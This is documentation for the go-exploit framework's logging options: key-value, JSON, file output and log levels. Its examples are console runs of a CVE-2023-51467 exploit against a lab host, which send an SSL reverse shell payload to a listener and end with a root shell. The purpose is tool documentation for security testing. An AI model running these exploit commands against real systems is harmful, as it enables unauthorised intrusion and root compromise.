# Output

`go-exploit` supports somewhat unusual output for an exploit framework. However, our belief is that `go-exploit` is more powerful when combined with other automation. As such, it's important that `go-exploit` output data in a form that other machines can easily read. To support that, `go-exploit` supports structured output and log levels. `go-exploit` supports two types of structured output: key-value pairs and JSON.

## Key-Value Output

`go-exploit` defaults to key-value output. It looks like the following:

```sh
albinolobster@mournland:~/cve-2023-51467$ ./build/cve-2023-51467_linux-arm64 -a -c -e -rhost 10.9.49.88 -rport 8443 -lhost 10.9.49.75 -lport 1271
time=2024-03-05T09:37:18.216-05:00 level=STATUS msg="Certificate not provided. Generating a TLS Certificate"
time=2024-03-05T09:37:18.507-05:00 level=STATUS msg="Starting TLS listener on 10.9.49.75:1271"
time=2024-03-05T09:37:18.507-05:00 level=STATUS msg="Starting target" index=0 host=10.9.49.88 port=8443 ssl=false "ssl auto"=true
time=2024-03-05T09:37:18.614-05:00 level=STATUS msg="Running a version check on the remote target" host=10.9.49.88 port=8443
time=2024-03-05T09:37:18.928-05:00 level=VERSION msg="The self-reported version is: 18.12" host=10.9.49.88 port=8443 version=18.12
time=2024-03-05T09:37:18.928-05:00 level=SUCCESS msg="The target *might* be a vulnerable version. Continuing." host=10.9.49.88 port=8443 vulnerable=possibly
time=2024-03-05T09:37:18.928-05:00 level=STATUS msg="Sending an SSL reverse shell payload for port 10.9.49.75:1271"
time=2024-03-05T09:37:18.928-05:00 level=STATUS msg="Throwing exploit at https://10.9.49.88:8443/webtools/control/ProgramExport/"
time=2024-03-05T09:37:19.485-05:00 level=SUCCESS msg="Caught new shell from 10.9.49.88:38888"
time=2024-03-05T09:37:19.486-05:00 level=STATUS msg="Active shell from 10.9.49.88:38888"
id
uid=0(root) gid=0(root) groups=0(root
```

Note that when the user drops down into a shell, structured output is not supported.

## JSON Output

JSON output may sometimes be preferable. The user only need provide `-log-json` to switch the format:

```sh
albinolobster@mournland:~/cve-2023-51467$ ./build/cve-2023-51467_linux-arm64 -a -c -e -rhost 10.9.49.88 -rport 8443 -lhost 10.9.49.75 -lport 1271 -log-json
{"time":"2024-03-05T09:38:56.495757869-05:00","level":"STATUS","msg":"Certificate not provided. Generating a TLS Certificate"}
{"time":"2024-03-05T09:38:56.576600457-05:00","level":"STATUS","msg":"Starting TLS listener on 10.9.49.75:1271"}
{"time":"2024-03-05T09:38:56.576923665-05:00","level":"STATUS","msg":"Starting target","index":0,"host":"10.9.49.88","port":8443,"ssl":false,"ssl auto":true}
{"time":"2024-03-05T09:38:56.856895303-05:00","level":"STATUS","msg":"Running a version check on the remote target","host":"10.9.49.88","port":8443}
{"time":"2024-03-05T09:38:57.63968813-05:00","level":"VERSION","msg":"The self-reported version is: 18.12","host":"10.9.49.88","port":8443,"version":"18.12"}
{"time":"2024-03-05T09:38:57.63978138-05:00","level":"SUCCESS","msg":"The target *might* be a vulnerable version. Continuing.","host":"10.9.49.88","port":8443,"vulnerable":"possibly"}
{"time":"2024-03-05T09:38:57.640026421-05:00","level":"STATUS","msg":"Sending an SSL reverse shell payload for port 10.9.49.75:1271"}
{"time":"2024-03-05T09:38:57.640299255-05:00","level":"STATUS","msg":"Throwing exploit at https://10.9.49.88:8443/webtools/control/ProgramExport/"}
{"time":"2024-03-05T09:38:58.189670445-05:00","level":"SUCCESS","msg":"Caught new shell from 10.9.49.88:51544"}
{"time":"2024-03-05T09:38:58.189787528-05:00","level":"STATUS","msg":"Active shell from 10.9.49.88:51544"}
id
uid=0(root) gid=0(root) groups=0(root)
```

## File Output

Output can also be sent to a file. Again, this is a simple flag: `-log-file <filename>`. An important feature to note is that `-log-file` appends to files and does not overwrite:

```sh
albinolobster@mournland:~/cve-2023-51467$ ./build/cve-2023-51467_linux-arm64 -a -c -e -rhost 10.9.49.88 -rport 8443 -lhost 10.9.49.75 -lport 1271 -log-json -log-file /tmp/test
id
uid=0(root) gid=0(root) groups=0(root)
^C
albinolobster@mournland:~/cve-2023-51467$ tail /tmp/test 
{"time":"2024-03-05T09:40:28.027454732-05:00","level":"STATUS","msg":"Starting TLS listener on 10.9.49.75:1271"}
{"time":"2024-03-05T09:40:28.027820606-05:00","level":"STATUS","msg":"Starting target","index":0,"host":"10.9.49.88","port":8443,"ssl":false,"ssl auto":true}
{"time":"2024-03-05T09:40:28.156731155-05:00","level":"STATUS","msg":"Running a version check on the remote target","host":"10.9.49.88","port":8443}
{"time":"2024-03-05T09:40:28.454126158-05:00","level":"VERSION","msg":"The self-reported version is: 18.12","host":"10.9.49.88","port":8443,"version":"18.12"}
{"time":"2024-03-05T09:40:28.454184074-05:00","level":"SUCCESS","msg":"The target *might* be a vulnerable version. Continuing.","host":"10.9.49.88","port":8443,"vulnerable":"possibly"}
{"time":"2024-03-05T09:40:28.454247324-05:00","level":"STATUS","msg":"Sending an SSL reverse shell payload for port 10.9.49.75:1271"}
{"time":"2024-03-05T09:40:28.454333616-05:00","level":"STATUS","msg":"Throwing exploit at https://10.9.49.88:8443/webtools/control/ProgramExport/"}
{"time":"2024-03-05T09:40:28.946425607-05:00","level":"SUCCESS","msg":"Caught new shell from 10.9.49.88:44990"}
{"time":"2024-03-05T09:40:28.946604441-05:00","level":"STATUS","msg":"Active shell from 10.9.49.88:44990"}
{"time":"2024-03-05T09:40:38.45622329-05:00","level":"SUCCESS","msg":"Exploit successfully completed","exploited":true}
```

## Log Levels

`go-exploit` supports log levels (as you can see in the output above). Perhaps somewhat oddly, the framework supports two log levels. One is for logs messages written by the framework (`-fll`) and the other is for logs written for logs written by the implementing exploit (`-ell`). The following example restricts the framework to `VERSION` messages and higher:

```
albinolobster@mournland:~/cve-2023-51467$ ./build/cve-2023-51467_linux-arm64 -a -c -rhost 10.9.49.88 -rport 8443 -fll VERSION
time=2024-03-05T09:44:41.436-05:00 level=VERSION msg="The self-reported version is: 18.12" host=10.9.49.88 port=8443 version=18.12
time=2024-03-05T09:44:41.436-05:00 level=SUCCESS msg="The target *might* be a vulnerable version. Continuing." host=10.9.49.88 port=8443 vulnerable=possibly
```

The following restricts the framework to `SUCCESS` messages and higher, and the exploit to `SUCCESS` or higher:

```sh
albinolobster@mournland:~/cve-2023-51467$ ./build/cve-2023-51467_linux-arm64 -a -c -e -rhost 10.9.49.88 -rport 8443 -lhost 10.9.49.75 -lport 1271 -ell SUCCESS -fll SUCCESS
time=2024-03-05T09:45:45.969-05:00 level=SUCCESS msg="The target *might* be a vulnerable version. Continuing." host=10.9.49.88 port=8443 vulnerable=possibly
time=2024-03-05T09:45:46.365-05:00 level=SUCCESS msg="Caught new shell from 10.9.49.88:41130"
id
uid=0(root) gid=0(root) groups=0(roo
```
